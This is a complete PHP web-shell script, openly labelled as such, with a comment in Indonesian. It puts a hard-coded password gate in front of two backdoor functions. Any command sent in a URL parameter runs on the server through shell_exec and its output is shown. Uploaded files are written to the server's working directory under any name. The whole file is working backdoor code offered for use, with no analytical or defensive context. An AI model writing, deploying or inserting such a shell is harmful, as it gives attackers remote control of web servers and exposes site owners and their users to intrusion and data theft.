<?php
error_reporting(0);
set_time_limit(0);
$auth_pass = "yourpassword"; // Ganti dengan password rahasia untuk akses
$dir = getcwd();
$ip = $_SERVER['REMOTE_ADDR'];
$method = $_SERVER['REQUEST_METHOD'];

function auth() {
    global $auth_pass;
    if (!isset($_COOKIE['shell_access']) || $_COOKIE['shell_access'] !== $auth_pass) {
        if (isset($_POST['pass']) && $_POST['pass'] === $auth_pass) {
            setcookie("shell_access", $auth_pass, time() + (86400 * 30), "/");
        } else {
            die("<form method='post'>Password: <input type='password' name='pass'><input type='submit' value='Login'></form>");
        }
    }
}

auth();
echo "<h1>Shell Access Granted!</h1>";
echo "<p>Current Directory: $dir</p>";
echo "<p>Your IP: $ip | Method: $method</p>";

if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}

if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "<p>File uploaded: " . $_FILES['file']['name'] . "</p>";
}

echo "<form method='get'><input type='text' name='cmd' placeholder='Command'><input type='submit' value='Execute'></form>";
echo "<form method='post' enctype='multipart/form-data'><input type='file' name='file'><input type='submit' value='Upload'></form>";
?>
